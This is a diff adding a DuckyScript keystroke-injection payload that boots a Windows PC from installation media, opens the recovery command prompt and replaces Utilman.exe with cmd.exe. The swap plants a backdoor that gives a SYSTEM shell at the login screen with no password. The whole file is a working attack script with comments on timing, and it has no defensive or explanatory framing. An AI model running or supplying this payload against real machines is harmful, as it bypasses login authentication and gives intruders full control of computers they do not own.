@@ -1,0 +1,55 @@
+DELAY 1000
+REM Press F12 to enter boot menu (timing may need to be adjusted)
+F12
+DELAY 5000  REM Adjust delay depending on boot time to reach boot menu
+
+REM Select installation media from boot menu (this step may require customization depending on the system)
+DOWN
+DOWN
+ENTER
+DELAY 15000  REM Wait for installation media to boot
+
+REM Press Space Bar to confirm booting from media if needed
+SPACE
+DELAY 10000  REM Wait for Windows installation screen to load
+
+REM Navigate through installation screen to reach "Repair your computer"
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 5000
+
+REM Select Troubleshoot
+DOWN
+DOWN
+ENTER
+DELAY 3000
+
+REM Select Command Prompt
+DOWN
+ENTER
+DELAY 3000
+
+REM Execute the copy command for Utilman.exe
+STRING copy C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.1
+ENTER
+DELAY 1000
+
+REM Replace Utilman.exe with cmd.exe
+STRING copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
+ENTER
+DELAY 1000
+
+REM Confirm overwrite by typing 'Y'
+STRING Y
+ENTER
+DELAY 1000
+
+REM Exit command prompt and continue to boot Windows
+STRING exit
+ENTER
+DELAY 1000
+STRING exit
+ENTER
